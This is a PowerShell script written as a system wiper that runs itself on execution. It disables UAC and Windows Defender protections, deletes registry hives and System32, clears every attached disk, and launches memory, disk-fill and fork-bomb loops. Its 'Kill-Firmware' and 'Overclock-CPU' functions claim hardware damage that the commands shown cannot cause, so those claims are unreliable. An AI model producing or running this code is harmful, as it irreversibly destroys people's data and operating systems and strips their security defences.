
function Escalate-Privileges {
    Start-Process powershell -ArgumentList "-Command Start-Process powershell -Verb RunAs" -Wait
}

function Disable-Security {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Set-MpPreference -MAPSReporting 0
    Set-MpPreference -SubmitSamplesConsent 2
    Write-Host "[+] Security Measures Disabled"
}

function Kill-Firmware {
    $firmware = Get-WmiObject Win32_BIOS
    $firmware.SMBIOSBIOSVersion = "Corrupted"
    Set-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System\BIOS" -Name BIOSVersion -Value "NULL"
    Write-Host "[!] BIOS/UEFI Overwritten"
}

function Destroy-Registry {
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Recurse -Force
    Remove-Item -Path "HKLM:\SYSTEM" -Recurse -Force
    Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Recurse -Force
    Write-Host "[!] Registry Hive Deleted"
}

function Corrupt-Disk {
    Get-Disk | ForEach-Object {
        $_ | Clear-Disk -RemoveData -Confirm:$false
    }
    Write-Host "[!] Disk Wiped"
}

function RAM-Flood {
    while ($true) {
        $a = @("X" * 5GB)
    }
}

function Overclock-CPU {
    wmic cpu set CurrentClockSpeed=999999
    Write-Host "[!] CPU Overclocked"
}

function Fill-Disk {
    $path = "C:\overload"
    if (-not (Test-Path $path)) {
        New-Item -ItemType Directory -Path $path
    }
    while ($true) {
        fsutil file createnew "$path\$(Get-Random).bin" 500000000
    }
}

function Fork-Bomb {
    while ($true) {
        Start-Job { Fork-Bomb }
    }
}

function Nuke-System32 {
    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
    Write-Host "[!] System32 Wiped"
}

function Initiate-Destruction {
    Escalate-Privileges
    Disable-Security
    Start-Job { Destroy-Registry }
    Start-Job { Kill-Firmware }
    Start-Job { Corrupt-Disk }
    Start-Job { RAM-Flood }
    Start-Job { Overclock-CPU }
    Start-Job { Fill-Disk }
    Start-Job { Fork-Bomb }
    Start-Job { Nuke-System32 }
    Write-Host "[!] Full System Overload - No Recovery Possible"
}

Initiate-Destruction
